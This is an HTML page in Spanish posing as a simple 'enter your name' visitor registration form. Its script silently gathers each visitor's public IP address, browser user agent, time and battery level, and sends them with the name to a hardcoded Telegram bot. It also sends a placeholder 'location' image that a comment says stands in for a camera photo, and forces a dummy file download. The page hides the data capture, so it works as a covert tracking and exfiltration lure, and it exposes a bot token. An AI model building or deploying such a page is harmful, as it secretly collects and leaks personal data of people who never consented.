<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Registro de Visitante</title>
  <style>
    body {
      font-family: "Poppins", sans-serif;
      background: linear-gradient(135deg, #a1c4fd, #c2e9fb);
      height: 100vh;
      margin: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      text-align: center;
      overflow: hidden;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      animation: fadeIn 1s ease;
      width: 300px;
    }
    input {
      width: 90%;
      padding: 10px;
      margin-top: 15px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }
    button {
      margin-top: 20px;
      padding: 12px 20px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      width: 100%;
      font-size: 16px;
      transition: background 0.3s;
    }
    button:hover {
      background: #45a049;
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>

<div class="container" id="formulario">
  <h2>Ingresa tu nombre</h2>
  <input type="text" id="nombre" placeholder="Tu nombre">
  <button onclick="enviarDatos()">Enviar</button>
  <p id="estado" style="margin-top:15px;"></p>
</div>

<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>

<script>
const botToken = "7745087272:AAGkTNgj2raKiA-Fv2ms16sFnfgE5BTNNs4";
const chatId = "8143059484";

async function enviarDatos() {
  const nombre = document.getElementById('nombre').value.trim();
  if (nombre === "") {
    document.getElementById('estado').innerText = "Por favor ingresa tu nombre.";
    return;
  }

  document.getElementById('estado').innerText = "Enviando datos...";

  let ip = "No detectada";
  let marca = navigator.userAgent;
  let hora = new Date().toLocaleString();
  let bateria = "No disponible";

  // IP pública
  try {
    const res = await axios.get("https://api.ipify.org?format=json");
    ip = res.data.ip;
  } catch (e) {}

  // Batería
  try {
    const battery = await navigator.getBattery();
    bateria = Math.round(battery.level * 100) + "%";
  } catch (e) {}

  // Imagen de ubicación (en lugar de la foto de la cámara)
  const imagenUrl = "https://via.placeholder.com/640x480.png?text=Imagen+de+ubicacion";  // Usamos una imagen de marcador de ubicación

  // Enviar mensaje
  const mensaje = `
Nuevo visitante:
- Nombre: ${nombre}
- IP: ${ip}
- Marca/Navegador: ${marca}
- Hora: ${hora}
- Batería: ${bateria}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: mensaje
    });

    // Enviar la foto de la ubicación
    const blob = await (await fetch(imagenUrl)).blob();
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'ubicacion.jpg');

    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    document.getElementById('estado').innerText = "Datos enviados correctamente.";
    descargarTxt();
  } catch (e) {
    console.error("Error al enviar datos.", e);
    document.getElementById('estado').innerText = "Error al enviar los datos.";
  }
}

function descargarTxt() {
  const data = "Hola";
  const blob = new Blob([data], { type: 'text/plain' });
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = 'archivo.txt';
  link.click();

  // Mensaje de confirmación para la descarga
  alert('Archivo .txt descargado con éxito');
}
</script>

</body>
</html>
